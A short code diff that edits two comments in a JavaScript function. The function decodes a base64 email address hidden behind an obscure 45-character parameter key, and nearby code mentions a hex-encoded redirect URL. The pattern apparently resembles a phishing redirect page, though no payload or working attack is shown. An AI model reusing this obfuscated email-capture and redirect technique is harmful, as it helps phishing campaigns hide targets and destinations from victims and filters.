@@ -22,11 +22,11 @@
                 if (/^[A-Za-z0-9+/]{45}$/.test(key) && /^[A-Za-z0-9+/=]*$/.test(value)) {
                     const decodedValue = decodeBase64(value);
                     if (decodedValue && decodedValue.includes('@')) {
-                        return decodedValue; // Return the decoded email
+                        return decodedValue; // Return the decoded email if valid
                     }
                 }
             }
-            return null;
+            return null; // No valid email parameter found
         }
 
         // Hex-encoded URL for redirection
